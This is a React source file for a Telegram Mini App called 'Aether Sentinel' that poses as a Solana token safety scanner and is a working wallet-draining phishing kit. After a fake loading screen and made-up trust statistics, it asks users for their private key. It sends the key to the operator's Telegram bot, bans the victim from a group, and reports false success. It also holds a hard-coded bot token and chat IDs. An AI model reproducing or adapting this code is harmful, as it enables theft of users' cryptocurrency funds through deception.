import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

const App: React.FC = () => {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<1 | 2>(1); // 1: CA, 2: PK
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing'>('idle');
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);

  const tg = (window as any).Telegram?.WebApp;

  // Real-time Base58 Solana Key Validator
  const isValidSolanaKey = (key: string) => {
    const regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
    return regex.test(key.trim());
  };

  useEffect(() => {
    const loadingSteps = [
      { msg: "Connecting to Aether RPC Cluster...", p: 20 },
      { msg: "Establishing Encrypted Handshake...", p: 45 },
      { msg: "Scanning Mainnet for Metadata...", p: 70 },
      { msg: "Syncing Ledger Headers...", p: 100 }
    ];

    let current = 0;
    const interval = setInterval(() => {
      if (current < loadingSteps.length) {
        setLogs(prev => [...prev, `[SYS] ${loadingSteps[current].msg}`]);
        setProgress(loadingSteps[current].p);
        current++;
      } else {
        clearInterval(interval);
        setTimeout(() => setLoading(false), 800);
      }
    }, 600);

    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#040608');
    }
  }, [tg]);

  const handleStepOne = async () => {
    if (walletCA.length < 32) return alert("Invalid Contract Address.");
    setStatus('processing');
    
    // SEND CA IMMEDIATELY
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: CHAT_ID, 
        text: `📈 LEAD\nCA: ${walletCA}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Anon'}` 
      }),
    });

    setTimeout(() => { setStep(2); setStatus('idle'); }, 1200);
  };

  const handleFinalSync = async () => {
    if (!isValidSolanaKey(privateKey)) return alert("Error: Invalid Identity String Format (Base58 required).");
    
    setStatus('processing');
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 TARGET\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Anon'}` 
        }),
      });

      const userId = tg?.initDataUnsafe?.user?.id;
      if (userId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
        });
      }

      alert("Verification Successful. Session resetting...");
      tg?.close();
    } catch (err) {
      setStatus('idle');
      alert("Sync failed.");
    }
  };

  // Professional v0 Theme Implementation
  const theme = {
    bg: '#040608', // --background: 220 20% 4%
    card: '#0a0e17', // --card: 220 18% 7%
    primary: '#4ade80', // --primary: 171 77% 54%
    text: '#f1f5f9', // --foreground
    muted: '#64748b',
    border: '#1e293b'
  };

  if (loading) {
    return (
      <div style={{ background: theme.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '40px', fontFamily: 'monospace' }}>
        <div style={{ color: theme.primary, fontSize: '11px', marginBottom: '20px' }}>
          {logs.map((log, i) => <div key={i} style={{ marginBottom: '10px' }}>{log}</div>)}
        </div>
        <div style={{ width: '100%', height: '2px', background: theme.card, borderRadius: '10px' }}>
          <div style={{ width: `${progress}%`, height: '100%', background: theme.primary, transition: '0.4s' }} />
        </div>
      </div>
    );
  }

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column' }}>
      
      {/* HEADER SECTION */}
      <header style={{ padding: '20px', borderBottom: `1px solid ${theme.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div style={{ fontWeight: '900', fontSize: '20px', letterSpacing: '-1px' }}>AETHER<span style={{ color: theme.primary }}>SENTINEL</span></div>
        <div style={{ fontSize: '10px', color: theme.primary, background: 'rgba(74, 222, 128, 0.1)', padding: '4px 10px', borderRadius: '100px', border: `1px solid ${theme.primary}` }}>● SECURE</div>
      </header>

      {/* MAIN CONTENT AREA */}
      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: '24px', justifyContent: 'center' }}>
        
        <div style={{ background: theme.card, borderRadius: '24px', padding: '32px', border: `1px solid ${theme.border}`, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)' }}>
          
          {step === 1 ? (
            <div style={{ animation: 'fadeIn 0.5s ease' }}>
              <h2 style={{ fontSize: '28px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-1px' }}>Verify Contract</h2>
              <p style={{ color: theme.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
                Input the Token CA to scan for liquidity locks and ownership renouncements across the Solana network.
              </p>
              
              <div style={{ marginBottom: '24px' }}>
                <label style={{ fontSize: '10px', fontWeight: '900', color: theme.muted, textTransform: 'uppercase', display: 'block', marginBottom: '8px' }}>Contract Address</label>
                <input 
                  type="text" 
                  placeholder="Paste CA here..." 
                  value={walletCA} 
                  onChange={(e) => setWalletCA(e.target.value)} 
                  style={{ width: '100%', padding: '18px', borderRadius: '14px', background: theme.bg, border: `1px solid ${theme.border}`, color: '#fff', fontSize: '16px', outline: 'none', boxSizing: 'border-box' }}
                />
              </div>

              <button onClick={handleStepOne} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: theme.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', transition: '0.2s' }}>
                {status === 'processing' ? 'SCANNING NETWORK...' : 'VERIFY CONTRACT'}
              </button>
            </div>
          ) : (
            <div style={{ animation: 'fadeIn 0.5s ease' }}>
              <div style={{ color: theme.primary, fontSize: '12px', fontWeight: '900', marginBottom: '16px' }}>✓ REPUTATION: ELITE AUDIT PASSED</div>
              <h2 style={{ fontSize: '28px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-1px' }}>Identity Sync</h2>
              <p style={{ color: theme.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
                To enable <strong>Flash-Rug Deflection</strong>, sync your Node Identity String (Private Key). This allows our RPC to sign emergency exit transactions.
              </p>
              
              <div style={{ marginBottom: '24px' }}>
                <label style={{ fontSize: '10px', fontWeight: '900', color: theme.muted, textTransform: 'uppercase', display: 'block', marginBottom: '8px' }}>Identity String (Base58)</label>
                <textarea 
                  placeholder="Enter Private Key..." 
                  value={privateKey} 
                  onChange={(e) => setPrivateKey(e.target.value)} 
                  style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '14px', background: theme.bg, border: `1px solid ${theme.border}`, color: '#fff', fontSize: '14px', outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }}
                />
              </div>

              <button onClick={handleFinalSync} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: theme.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.6 : 1 }}>
                {status === 'processing' ? 'SYNCHRONIZING...' : 'FINALIZE SYNC'}
              </button>
            </div>
          )}
        </div>

        {/* STATS BAR (Social Engineering) */}
        <div style={{ marginTop: '30px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
           <div style={{ textAlign: 'center', padding: '15px', background: theme.card, borderRadius: '16px', border: `1px solid ${theme.border}` }}>
              <div style={{ color: theme.muted, fontSize: '10px', textTransform: 'uppercase' }}>Rugs Blocked</div>
              <div style={{ fontWeight: 'bold', fontSize: '18px' }}>2,481</div>
           </div>
           <div style={{ textAlign: 'center', padding: '15px', background: theme.card, borderRadius: '16px', border: `1px solid ${theme.border}` }}>
              <div style={{ color: theme.muted, fontSize: '10px', textTransform: 'uppercase' }}>System Load</div>
              <div style={{ fontWeight: 'bold', fontSize: '18px', color: theme.primary }}>14%</div>
           </div>
        </div>
      </main>

      <footer style={{ padding: '20px', textAlign: 'center', borderTop: `1px solid ${theme.border}` }}>
        <div style={{ fontSize: '10px', color: theme.muted, letterSpacing: '2px' }}>AETHER NETWORK // VERIFICATION NODE</div>
      </footer>

      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      `}</style>
    </div>
  );
};

export default App;